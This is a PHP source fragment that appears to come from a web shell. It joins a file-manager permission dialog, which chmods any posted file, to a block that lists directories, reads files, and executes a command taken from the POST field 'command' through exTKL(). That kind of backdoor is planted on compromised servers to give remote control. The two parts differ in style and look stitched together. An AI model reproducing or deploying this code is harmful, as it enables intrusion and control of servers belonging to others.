		if (!empty($_POST['ur'])) $mode |= 0400; if (!empty($_POST['uw'])) $mode |= 0200; if (!empty($_POST['ux'])) $mode |= 0100;
		if (!empty($_POST['gr'])) $mode |= 0040; if (!empty($_POST['gw'])) $mode |= 0020; if (!empty($_POST['gx'])) $mode |= 0010;
		if (!empty($_POST['or'])) $mode |= 0004; if (!empty($_POST['ow'])) $mode |= 0002; if (!empty($_POST['ox'])) $mode |= 0001;

		if (@chmod($file, $mode)) {
			listing_page(notice('permission_set', $file, decoct($mode)));
		} else {
			listing_page(error('permission_not_set', $file, decoct($mode)));
		}
	} else {
		html_header();
		$mode = fileperms($file);
		echo '<form action="' . $self . '?tool=Files" method="post">
<table class="dialog">
<tr>
<td class="dialog">
	<p style="margin: 0">' . phrase('permission_for', $file) . '</p>
	<hr />
	<table id="permission">
	<tr>
		<td></td>
		<td style="border-right: 1px solid black">' . word('owner') . '</td>
		<td style="border-right: 1px solid black">' . word('group') . '</td>
		<td>' . word('other') . '</td>
	</tr>
	<tr>
		<td style="text-align: right">' . word('read') . ':</td>
		<td><input type="checkbox" name="ur" value="1"'; if ($mode & 00400) echo ' checked="checked"'; echo ' /></td>
		<td><input type="checkbox" name="gr" value="1"'; if ($mode & 00040) echo ' checked="checked"'; echo ' /></td>
		<td><input type="checkbox" name="or" value="1"'; if ($mode & 00004) echo ' checked="checked"'; echo ' /></td>
	</tr>
	<tr>
		<td style="text-align: right">' . word('write') . ':</td>
		<td><input type="checkbox" name="uw" value="1"'; if ($mode & 00200) echo ' checked="checked"'; echo ' /></td>
		<td><input type="checkbox" name="gw" value="1"'; if ($mode & 00020) echo ' checked="checked"'; echo ' /></td>
		<td><input type="checkbox" name="ow" value="1"'; if ($mode & 00002) echo ' checked="checked"'; echo ' /></td>
	</tr>
	<tr>
		<td style="text-align: right">' . word('execute') . ':</td>
		<td><input type="checkbox" name="ux" value="1"'; if ($mode & 00100) echo ' checked="checked"'; echo ' /></td>
		<td><input type="checkbox" name="gx" value="1"'; if ($mode & 00010) echo ' checked="checked"'; echo ' /></td>
		<td><input type="checkbox" name="ox" value="1"'; if ($mode & 00001) echo ' checked="checked"'; echo ' /></td>
	</tr>
	</table>
	<hr />
	<input type="submit" name="set" value="' . word('set') . '" />
	<input type="hidden" name="action" value="permission" />
	<input type="hidden" name="file" value="' . html($file) . '" />
	<input type="hidden" name="dir" value="' . html($directory) . '" />
</td>
</tr>
</table>
<p><a href="' . $self . '?tool=Files&dir=' . urlencode($directory) . '">[ ' . word('back') . ' ]</a></p>
</form>
';
		html_footer();
	}
	break;
default:
	listing_page();
}

exit;
}
echo '<table width="100%" border="0"><tr><td rowspan="1">';
dirTKL ($dir);
echo '</td><td align="right" valign="bottom" ><textarea rows="15" cols="100" >';
if (!$function_tkl == ''){
readFileTKL ($function_tkl,$pwd);
}
if (!$_POST['command'] == ''){
exTKL ();
}
if ($_POST['function_tkl'] == 'mysql1'){
echo $gaza_file;
}
fotTKL($gaza_text,$gaza_text1,$dir);
?>
